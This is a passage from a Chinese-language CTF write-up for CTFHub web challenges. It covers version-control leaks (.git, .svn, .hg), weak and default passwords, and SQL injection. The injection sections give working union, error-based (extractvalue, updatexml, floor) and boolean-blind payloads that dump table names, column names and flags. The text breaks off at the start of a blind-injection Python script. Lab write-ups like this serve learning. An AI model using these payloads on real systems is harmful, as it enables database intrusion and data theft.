<p><img src="https://upyun.wuuconix.link/image-20210823103526208.png" srcset="/img/loading.gif" lazyload alt=".git" /></p>
<p>然后输入<code>git stash list</code>就能看到所有的stash存储，发现第一个<code>stash@&#123;0&#125;</code>存储了一个加入flag的状态。</p>
<p>之后利用<code>git stash apply stash@&#123;0&#125;</code>即可恢复到那一个状态，成功得到flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210823103724835.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<h3 id="git泄露index"><a class="markdownIt-Anchor" href="#git泄露index"></a> Git泄露——Index</h3>
<p>说是Index，但是我这里githack一恢复，一ls，就有flag了是怎么回事啊23333。</p>
<p><img src="https://upyun.wuuconix.link/image-20210823105819611.png" srcset="/img/loading.gif" lazyload alt="自己急着出来的flag" /></p>
<p>​</p>
<h3 id="svn泄露"><a class="markdownIt-Anchor" href="#svn泄露"></a> SVN泄露</h3>
<p>题干没有给出使用的工具。我根据在github上找了两个工具，一个是svnhack，一个是svnexploit，全部都是只能下载当前的源文件，不给你下载最关键的<code>.svn</code>文件夹。但是这道题的flag在旧版本中，现在是没有flag文件的。</p>
<p>最终无奈地看了writeup。才知道有一个叫做 <a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper</a> 的工具。</p>
<p><img src="https://upyun.wuuconix.link/image-20210823121025710.png" srcset="/img/loading.gif" lazyload alt="rip-svn" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210823121138285.png" srcset="/img/loading.gif" lazyload alt=".svn" /></p>
<p>有了.svn文件夹后，一般来说所有的文件都会在<code>.svn/pristine</code>有一个备份，包括被删掉的文件。</p>
<p><img src="https://upyun.wuuconix.link/image-20210823121513596.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>成功得到flag。</p>
<p>做完后我发现了一个不用这个工具就能得到flag的方法。</p>
<p>所有的备份文件都会在<code>.svn/pristine</code>这个目录下，然后每个文件比如这个<code>e0a15cc404c2351e8dce038c0c2d1a684419ed1c.svn-base</code></p>
<p>它就会在<code>.svn/pristine/e0/e0a15cc404c2351e8dce038c0c2d1a684419ed1c.svn-base</code>，这个e0就是文件的前两位。</p>
<p>所以我们只要知道了<code>e0a15cc404c2351e8dce038c0c2d1a684419ed1c</code>这一串乱码，我们就能锁定文件。</p>
<p>而这一串乱码可以在<code>.svn/wc.db</code>中找到。</p>
<p>这里解释一下为什么知道<code>wc.db</code>，因为是dirsearch扫到的，所以我就去看了一眼。</p>
<p><img src="https://upyun.wuuconix.link/image-20210823122643664.png" srcset="/img/loading.gif" lazyload alt="wc.db" /></p>
<p>这里就有两个乱码，分别对应flag文件和index.html。</p>
<p>最后吐槽一波<a target="_blank" rel="noopener" href="https://github.com/admintony/svnExploit">admintony/svnExploit</a>，为什么不把svn文件也一起下载下来 。还有明明已经发现flag文件了，却不给出checksum，这个checksum明明能够通过wc.db获得的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210823123014093.png" srcset="/img/loading.gif" lazyload alt="功能不完善的svnExploit" /></p>
<p>功能完善一下不秒杀这个 <a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper</a> ？</p>
<p>已经在项目下提了一个<a target="_blank" rel="noopener" href="https://github.com/admintony/svnExploit/issues/5">Issue</a>，让我们坐等作者更新2333。</p>
<h3 id="hg泄露"><a class="markdownIt-Anchor" href="#hg泄露"></a> HG泄露</h3>
<p><img src="https://upyun.wuuconix.link/image-20210824101115497.png" srcset="/img/loading.gif" lazyload alt="题目" /></p>
<p>查阅了一下资料，发现hg泄露也可以用昨天那个软件<a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">kost/dvcs-ripper</a>。但是貌似不好使，也不知道出了什么问题。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824101231796.png" srcset="/img/loading.gif" lazyload alt="rip-hg" /></p>
<p>没法，便用dirsearch扫了一下。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824101322822.png" srcset="/img/loading.gif" lazyload alt="dirsearch" /></p>
<p>把几个可访问的文件都下载后，在<code>/.hg/store/undo</code>后发现了flag文件。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824101511504.png" srcset="/img/loading.gif" lazyload alt="flag文件" /></p>
<p>访问后成功得到flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824101607577.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p><s>这道题告诉我们不能迷信工具，还得手工尝试。</s></p>
<p>佛了，做完后才发现那个工具是出结果了的，但是在命令返回结果全是404搞得好像什么都没出，大意了，下次应该用<code>-o</code>指定输出目录。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824103124831.png" srcset="/img/loading.gif" lazyload alt=".svn" /></p>
<h2 id="密码口令"><a class="markdownIt-Anchor" href="#密码口令"></a> 密码口令</h2>
<h3 id="弱口令"><a class="markdownIt-Anchor" href="#弱口令"></a> 弱口令</h3>
<p>前几天被vaala称为弱密码带师，结果被这道题卡住了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824112517204.png" srcset="/img/loading.gif" lazyload alt="vaala" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210824112541899.png" srcset="/img/loading.gif" lazyload alt="界面" /></p>
<p>跑了半天，用了好多字典，都不行。无奈看writeup。最后得知密码是admin123。</p>
<p>再看了看我的拥有19576个密码的密码字典。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824112644102.png" srcset="/img/loading.gif" lazyload alt="找不到admin123" /></p>
<p>留下了眼泪。</p>
<h3 id="默认口令"><a class="markdownIt-Anchor" href="#默认口令"></a> 默认口令</h3>
<p>这里让你找亿邮邮件网关的默认口令。滑稽的是，现在查亿邮邮件网关默认口令，查到的却全是ctfhub这道题的writeup。真正的信息来源已经被淹没了。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824114152558.png" srcset="/img/loading.gif" lazyload alt="eyou默认口令" /></p>
<p>测试之后是第二个。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824114217615.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h2>
<h3 id="整数型注入"><a class="markdownIt-Anchor" href="#整数型注入"></a> 整数型注入</h3>
<p><img src="https://upyun.wuuconix.link/image-20210824123902537.png" srcset="/img/loading.gif" lazyload alt="输入1" /></p>
<p>题目给出了完整的sql语句。select * 后页面返回了两个值，一个是ID。一个是Data。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>发现order by 3就不能正常显示了，说明一共就两个字段。我们也有充分的理由怀疑，这两列的字段分别为Id和Data。</p>
<p>接下来我们需要利用union select来爆信息。union select 的字段的个数需要和主select的个数一直，也就是两个。</p>
<p>然后如果你这样填。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(), <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p>你会发现你得不到你想要的数据，页面只会显示主select查询到第一行的数据。</p>
<p><img src="https://upyun.wuuconix.link/image-20210824124312418.png" srcset="/img/loading.gif" lazyload alt="or" /></p>
<p>所以我们需要让主select查询不到任何东西，而只显示我们select查询到的东西。</p>
<p>很显然这样就行了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(), <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210824124420064.png" srcset="/img/loading.gif" lazyload alt="得到数据库名" /></p>
<p>之后就是基本操作。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(table_name), <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210824124503242.png" srcset="/img/loading.gif" lazyload alt="得到所有表名" /></p>
<p>锁定flag表。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(column_name), <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210824124549522.png" srcset="/img/loading.gif" lazyload alt="得到列名" /></p>
<p>锁定flag表中的flag列。</p>
<p>进行查询。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> flag, <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210824124721876.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>不得不说，上学期学习了数据库之后对SQL的理解加深了许多，这道题很快做出来。</p>
<p>ctfhub的sql注入也非常友善，把完整的sql语句给出来了，非常适合新手来进行学习。</p>
<h3 id="字符型注入"><a class="markdownIt-Anchor" href="#字符型注入"></a> 字符型注入</h3>
<p>和上一篇整形注入几乎一致，但是这里有了引号，首先利用引号闭合，之后还需要利用注释符<code>#</code>还使原来的右引号失效。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select database(), 2#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825121539761.png" srcset="/img/loading.gif" lazyload alt="爆库" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 2, group_concat(table_name) from information_schema.tables where table_schema = &#x27;</span>sqli<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825121623587.png" srcset="/img/loading.gif" lazyload alt="爆表" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 2, group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>flag<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825121650658.png" srcset="/img/loading.gif" lazyload alt="爆字段" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=2 union select 2, flag from flag#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825121747063.png" srcset="/img/loading.gif" lazyload alt="查询flag" /></p>
<h3 id="报错注入"><a class="markdownIt-Anchor" href="#报错注入"></a> 报错注入</h3>
<p>利用extracvalue来xpath报错。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> database()))))<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141126993.png" srcset="/img/loading.gif" lazyload alt="extracvalue爆库" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;sqli&#x27;</span>))))<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141214074.png" srcset="/img/loading.gif" lazyload alt="extractvalue爆表" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;flag&#x27;</span>))))<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141241439.png" srcset="/img/loading.gif" lazyload alt="extract爆字段" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag))))<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141305150.png" srcset="/img/loading.gif" lazyload alt="extract得到flag" /></p>
<p>利用updatexml来xpath报错。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, (concat (<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> database()))),<span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141342744.png" srcset="/img/loading.gif" lazyload alt="updatexml爆库" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, (concat (<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span>))),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141414090.png" srcset="/img/loading.gif" lazyload alt="updatexml爆表" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, (concat (<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span>))),<span class="hljs-number">1</span>)) <br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141448334.png" srcset="/img/loading.gif" lazyload alt="updatexml爆字段" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, (<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag)), <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141514457.png" srcset="/img/loading.gif" lazyload alt="updatexml得到flag" /></p>
<p>利用floor来group by主键重复报错。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> database()), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141604672.png" srcset="/img/loading.gif" lazyload alt="group by爆库" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sqli&#x27;</span> limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure>
<p>注：图中有错误，在limit那里，正确的用法如上。</p>
<p><img src="https://upyun.wuuconix.link/image-20210825141630905.png" srcset="/img/loading.gif" lazyload alt="group by爆表" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141657226.png" srcset="/img/loading.gif" lazyload alt="group by 爆字段" /></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat((<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>), <span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) x <span class="hljs-keyword">from</span> news <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x<br></code></pre></td></tr></table></figure>
<p><img src="https://upyun.wuuconix.link/image-20210825141718197.png" srcset="/img/loading.gif" lazyload alt="group by得到flag" /></p>
<p>在30分钟里用三种方法报错注入得到flag，顺便写出writeup，感觉蛮快了2333。</p>
<p>extractvalue和updatexml用起来没什么问题，<s>很顺利。</s></p>
<p>突然发现用这两个函数得到的flag是不完整的。这两个函数的返回值最多只有32个字符。这里和最终的flag少了一个右大括号。</p>
<p>以后遇到这种问题再用一下<code>right()</code>获取右边的值即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210825150248266.png" srcset="/img/loading.gif" lazyload alt="right函数" /></p>
<p>用group by的时候问题很大，首先它貌似只试用于mysql 5.x的版本，以至于我在本地最新mysql版本上复现出来。关于这个问题在 csdn上 写了一篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/Cypher_X/article/details/119909526">博客</a>。</p>
<p>然后我发现用这个group by来报错的时候不能用爆表和爆字段的时候不能用<code>group_concat</code>。但是我在本地测试的时候又可以，很奇怪，感觉是题目的锅。</p>
<p><img src="https://upyun.wuuconix.link/image-20210825151004811.png" srcset="/img/loading.gif" lazyload alt="本地成功用group_concat" /></p>
<p>但是没关系，不用group_concat就手动一个个查，利用limit来控制。</p>
<p><img src="https://upyun.wuuconix.link/image-20210825151444215.png" srcset="/img/loading.gif" lazyload alt="limit的用法" /></p>
<p>limit的第一个值表示从 第几行开始，第二个值表示从开始的行取几行。</p>
<h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h3>
<p>布尔盲注使用场景的特征十分明显，即界面不会给出查询的具体结果，也不会给你报错信息。而只会告诉你查询成功还是查询失败。</p>
<p>这就需要我们去利用一些神奇的函数比如<code>substr</code>,<code>ascii</code>,<code>length</code>来猜测。</p>
<p>猜测什么呢？首先猜测数据库的长度，知道了长度，就去猜数据库每个字符。知道了数据库，就去猜数据表的个数，表名长度，具体表名等等等等。也就是所有的一切都是你需要用上面的函数来猜出来的。</p>
<p>如果手工来实现这一过程，就会变得非常繁琐，这里我花了一个下午的时间写了一个盲注的脚本。</p>
<p>运行过程十分舒适和人性化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>success_flag = <span class="hljs-string">&quot;query_success&quot;</span> <span class="hljs-comment">#成功查询到内容的关键字</span><br>base_url = <span class="hljs-string">&quot;http://challenge-d41158772186d1b6.sandbox.ctfhub.com:10800/?id=&quot;</span><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 